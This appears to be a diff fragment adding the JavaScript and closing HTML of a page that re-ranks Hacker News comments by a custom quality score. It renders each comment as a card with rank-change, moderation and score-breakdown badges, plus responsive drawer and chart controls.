+      clrBtn.addEventListener("click", clearSelectedPoint);
+    }
+
+    const rescueJump = Math.max(25, Math.min(150, Math.round(TOTAL_N * 0.15)));
+    const demoteDrop = -Math.max(40, Math.min(300, Math.round(TOTAL_N * 0.25)));
+    const box = document.getElementById("cardContainer");
+    box.innerHTML = shown.map(c => {
+      const delta = c.dom - c.liveRank;
+      const deltaBadge = delta >= rescueJump
+        ? `<span class="badge rescue">RESCUED +${delta} SPOTS</span>`
+        : (delta <= demoteDrop ? `<span class="badge drop">DEMOTED ${delta} SPOTS</span>` : "");
+      const fadeBadge = c.dt === 1
+        ? `<span class="badge c5a">HN FADE: ${escHtml(c.fade)} (RESCUED)</span>`
+        : (c.dt >= 2 ? `<span class="badge drop">HN FADE: ${escHtml(c.fade)} (TIER ${c.dt})</span>` : "");
+      const modBadge = c.mod ? `<span class="badge drop">MOD REBUKED (dang/tomhow)</span>` : "";
+      const surfBadge = c.surf >= 4.0 ? `<span class="badge c5a">SURF MIRAGE ${c.surf}x</span>` : "";
+      const urlLinks = c.urls.map(u => {
+        let host = "source";
+        try { host = new URL(u).hostname.replace(/^www\./, ""); } catch (_e) {}
+        return `<a class="ext-link" href="${escHtml(u)}">[${escHtml(host)}]</a>`;
+      }).join(" ");
+
+      const commClass = "comm-" + String(c.fade || "c00").toLowerCase();
+      return `<article class="c-card tier-${c.tier}">
+        <div class="hn-comhead">
+          <a href="https://news.ycombinator.com/user?id=${encodeURIComponent(c.au)}">${escHtml(c.au)}</a>
+          <span>${c.age} hours ago</span>
+          <span>|</span>
+          <span>depth ${c.d}</span>
+          <span>|</span>
+          <span>karma ${c.k.toLocaleString()} (${c.kpp}/post)</span>
+          <span>|</span>
+          <a href="https://news.ycombinator.com/item?id=${c.id}">link</a>
+        </div>
+        <div class="c-meta">
+          <span class="badge rank-sig">SIGNAL ${c.liveRank}</span>
+          <span class="badge">HN POS ${c.dom}</span>
+          ${deltaBadge} ${fadeBadge} ${modBadge} ${surfBadge}
+          <span class="badge">${escHtml(c.flbl || c.facet.replace(/_/g, " "))}</span>
+        </div>
+        <div class="c-body ${commClass}">${formatHnBody(c.txt)}</div>
+        <div class="vec-bars">
+          <span>SCORE: <strong>${c.liveScore.toFixed(2)}</strong></span>
+          <span>INFO: +${(curW.ig * c.ig).toFixed(2)}</span>
+          <span>FALSIFIABILITY: +${(curW.fa * c.fa).toFixed(2)}</span>
+          <span>GRAVITY/PRECISION: +${(curW.gp * c.gp).toFixed(2)}</span>
+          <span>BULLSHIT LOAD: -${(curW.bp * c.bl).toFixed(2)}</span>
+          <span>DOWNVOTE SINK: -${(curW.dp * c.ds).toFixed(2)}</span>
+          ${urlLinks ? `<span>LINKS: ${urlLinks}</span>` : ""}
+        </div>
+      </article>`;
+    }).join("");
+    if (window.scrollY !== prevScrollY) {
+      window.scrollTo(0, prevScrollY);
+    }
+  }
+
+  const modeSelect = document.getElementById("modeSelect");
+  modeSelect.addEventListener("change", () => {
+    activeMode = modeSelect.value;
+    selectedId = null;
+    document.getElementById("searchInput").value = "";
+    drawPhaseCanvas();
+    drawGravityCanvas();
+    renderCards();
+  });
+  document.getElementById("searchInput").addEventListener("input", renderCards);
+  document.getElementById("facetSelect").addEventListener("change", renderCards);
+
+  const labDrawer = document.getElementById("labDrawer");
+  const tunerDrawer = document.getElementById("tunerDrawer");
+  const phaseDrawer = document.getElementById("phaseDrawer");
+  const gravityDrawer = document.getElementById("gravityDrawer");
+  const graphDrawers = [tunerDrawer, phaseDrawer, gravityDrawer];
+
+  [labDrawer, phaseDrawer, gravityDrawer].forEach(d => {
+    d.addEventListener("toggle", () => {
+      if (d.open) {
+        drawPhaseCanvas();
+        drawGravityCanvas();
+      }
+    });
+  });
+
+  const mobMq = window.matchMedia("(max-width: 960px)");
+  function syncViewportDrawers(isMobile) {
+    if (!isMobile) {
+      // Desktop: Tuner & both graphs stay open side-by-side inside the lab drawer (mobile-only inner collapse)
+      graphDrawers.forEach(d => { d.open = true; });
+    } else {
+      // Mobile: keep Tuner & second graph collapsed initially so Phase Plane + Comments stay tight
+      tunerDrawer.open = false;
+    }
+    drawPhaseCanvas();
+    drawGravityCanvas();
+  }
+  syncViewportDrawers(mobMq.matches);
+  mobMq.addEventListener("change", (e) => syncViewportDrawers(e.matches));
+
+  syncSliders();
+  recomputeAndRender();
+})();
+</script>
+</body>
+</html>
